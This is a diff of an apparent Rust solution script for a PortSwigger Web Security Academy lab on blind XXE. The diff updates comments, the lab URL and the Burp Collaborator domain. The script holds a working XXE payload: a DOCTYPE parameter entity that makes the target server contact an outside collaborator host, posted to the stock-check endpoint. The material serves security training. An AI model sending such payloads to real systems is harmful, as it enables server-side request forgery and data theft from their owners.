@@ -6,8 +6,8 @@
 *
 * Lab: Blind XXE with out-of-band interaction via XML parameter entities
 *
-* Steps: 1. Inject payload into 'productId' XML element to issue a DNS lookup to
-*           burp collaborator using a parameter entity
+* Steps: 1. Inject payload into the XML-based check stock request to issue a DNS lookup
+*           to burp collaborator using a parameter entity
 *        2. Check your burp collaborator for the DNS lookup
 *
 ****************************************************************************************/
@@ -32,17 +32,17 @@ use text_colorizer::Colorize;
 *******************/
 fn main() {
     // change this to your lab URL
-    let url = "https://0a7900ad03037832bde75f53000200af.web-security-academy.net";
+    let url = "https://0ae40070048b5af480879f7a00640009.web-security-academy.net";
 
     // change this to your collaborator domain
-    let collaborator = "ua8ks17ampaqel2o8yyqkoamqdw4kw8l.oastify.com";
+    let collaborator = "ub9kkwtmnvvig04a3jlikljmud04o1cq.oastify.com";
 
     // build the client that will be used for all subsequent requests
     let client = build_client();
 
-    println!("{} {}", "⟪#⟫ Injection point:".blue(), "productId".yellow(),);
+    println!("{} {}", "⟪#⟫ Injection point:".blue(), "XML-based check stock request".yellow(),);
 
-    // payload to to issue a DNS lookup to burp collaborator using a parameter entity
+    // payload to issue a DNS lookup to burp collaborator using a parameter entity
     let payload = format!(
         r###"<?xml version="1.0" encoding="UTF-8"?>
             <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://{collaborator}"> %xxe; ]>
@@ -64,7 +64,7 @@ fn main() {
     io::stdout().flush();
 
     // fetch the page with the injected payload
-    let injection = client
+    client
         .post(format!("{url}/product/stock"))
         .header("Content-Type", "application/xml")
         .body(payload)
